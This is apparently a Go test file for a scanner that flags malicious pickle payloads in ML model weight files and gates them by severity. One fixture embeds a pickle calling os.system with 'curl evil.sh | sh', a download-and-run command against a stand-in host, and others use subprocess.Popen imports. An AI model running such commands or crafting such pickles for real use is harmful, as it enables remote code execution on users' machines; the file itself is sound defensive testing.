package mlguard

import (
	"archive/zip"
	"bytes"
	"io"
	"testing"
)

func testService(t *testing.T) *Service {
	t.Helper()
	svc, err := NewService(DefaultConfig())
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	return svc
}

func opener(b []byte) func() (io.ReadCloser, error) {
	return func() (io.ReadCloser, error) {
		return io.NopCloser(bytes.NewReader(b)), nil
	}
}

// zipWith builds a PyTorch-style ZIP archive containing the given entries.
func zipWith(t *testing.T, entries map[string][]byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, data := range entries {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("zip create: %v", err)
		}
		if _, err := w.Write(data); err != nil {
			t.Fatalf("zip write: %v", err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("zip close: %v", err)
	}
	return buf.Bytes()
}

func TestAssessSafetensorsPreferred(t *testing.T) {
	svc := testService(t)
	art := Artifact{Ecosystem: "huggingface", Name: "org/m", Version: "main", Filename: "model.safetensors"}
	report, err := svc.Assess(art, opener([]byte("safetensors header and tensors")))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if !report.SafeFormat || report.Format != FormatSafetensors {
		t.Errorf("safetensors not recognized as safe: %+v", report)
	}
	if d := svc.Gate(report, ""); d.Action != ActionAllow || d.Code != "safetensors-safe" {
		t.Errorf("decision = %+v, want allow/safetensors-safe", d)
	}
}

func TestAssessRawMaliciousPickleBlocked(t *testing.T) {
	svc := testService(t)
	art := Artifact{Ecosystem: "huggingface", Name: "evil/model", Version: "main", Filename: "pytorch_model.bin"}
	report, err := svc.Assess(art, opener(reducePickle("os", "system", "curl evil.sh | sh")))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if !report.Inspected || !report.HasFindings() {
		t.Fatalf("malicious pickle not flagged: %+v", report)
	}
	if report.MaxSeverity != SeverityCritical {
		t.Errorf("maxSeverity = %q, want critical", report.MaxSeverity)
	}
	d := svc.Gate(report, "")
	if d.Action != ActionBlock {
		t.Errorf("decision = %+v, want block", d)
	}
}

func TestAssessZipTorchPickleBlocked(t *testing.T) {
	svc := testService(t)
	archive := zipWith(t, map[string][]byte{
		"archive/data.pkl": stackGlobalPickle("subprocess", "Popen"),
		"archive/data/0":   bytes.Repeat([]byte{0x00}, 1024), // a "tensor" blob, ignored
	})
	art := Artifact{Ecosystem: "huggingface", Name: "evil/torch", Version: "main", Filename: "pytorch_model.bin"}
	report, err := svc.Assess(art, opener(archive))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if !report.Inspected || !report.HasFindings() {
		t.Fatalf("zip-wrapped malicious pickle not flagged: %+v", report)
	}
	if len(report.Imports) == 0 || report.Imports[0] != "subprocess.Popen" {
		t.Errorf("imports = %v, want subprocess.Popen", report.Imports)
	}
}

func TestAssessBenignTorchPickleAllowed(t *testing.T) {
	svc := testService(t)
	archive := zipWith(t, map[string][]byte{
		"archive/data.pkl": benignTorchPickle(),
	})
	art := Artifact{Ecosystem: "huggingface", Name: "good/torch", Version: "main", Filename: "pytorch_model.bin"}
	report, err := svc.Assess(art, opener(archive))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if !report.Inspected {
		t.Fatal("benign torch pickle not inspected")
	}
	if report.HasFindings() {
		t.Errorf("benign torch pickle flagged: %+v", report.Findings)
	}
	if d := svc.Gate(report, ""); d.Action != ActionAllow {
		t.Errorf("decision = %+v, want allow", d)
	}
}

func TestAssessNonWeightNotApplicable(t *testing.T) {
	svc := testService(t)
	art := Artifact{Ecosystem: "huggingface", Name: "org/m", Version: "main", Filename: "config.json"}
	report, err := svc.Assess(art, opener([]byte(`{"a":1}`)))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if report.Inspected || report.HasFindings() || report.Format != FormatOther {
		t.Errorf("non-weight file should not be inspected: %+v", report)
	}
}

func TestAssessNonMLEcosystemIgnored(t *testing.T) {
	svc := testService(t)
	art := Artifact{Ecosystem: "pip", Name: "requests", Version: "2.0", Filename: "model.bin"}
	report, err := svc.Assess(art, opener(reducePickle("os", "system", "x")))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	if report.Inspected || report.HasFindings() {
		t.Errorf("non-ML ecosystem should be ignored: %+v", report)
	}
}

func TestGateWarnMode(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Action = ActionWarn
	svc, err := NewService(cfg)
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	art := Artifact{Ecosystem: "huggingface", Name: "evil/model", Version: "main", Filename: "weights.pt"}
	report, _ := svc.Assess(art, opener(reducePickle("os", "system", "id")))
	if d := svc.Gate(report, ""); d.Action != ActionWarn {
		t.Errorf("decision = %+v, want warn", d)
	}
}

func TestTenantOverrideRelaxes(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Tenants = map[string]TenantConfig{"researchers": {Action: ActionWarn}}
	svc, err := NewService(cfg)
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	art := Artifact{Ecosystem: "huggingface", Name: "evil/model", Version: "main", Filename: "weights.pt"}
	report, _ := svc.Assess(art, opener(reducePickle("os", "system", "id")))
	if d := svc.Gate(report, "researchers"); d.Action != ActionWarn {
		t.Errorf("tenant decision = %+v, want warn", d)
	}
	if d := svc.Gate(report, ""); d.Action != ActionBlock {
		t.Errorf("default decision = %+v, want block", d)
	}
}

func TestConfigValidation(t *testing.T) {
	bad := Config{Enabled: true, FailSeverity: "bogus"}
	if _, err := NewService(bad); err == nil {
		t.Error("invalid failSeverity should be rejected")
	}
	warnTooHigh := Config{Enabled: true, FailSeverity: SeverityMedium, WarnSeverity: SeverityCritical, Action: ActionBlock}
	if _, err := NewService(warnTooHigh); err == nil {
		t.Error("warnSeverity exceeding failSeverity should be rejected")
	}
}
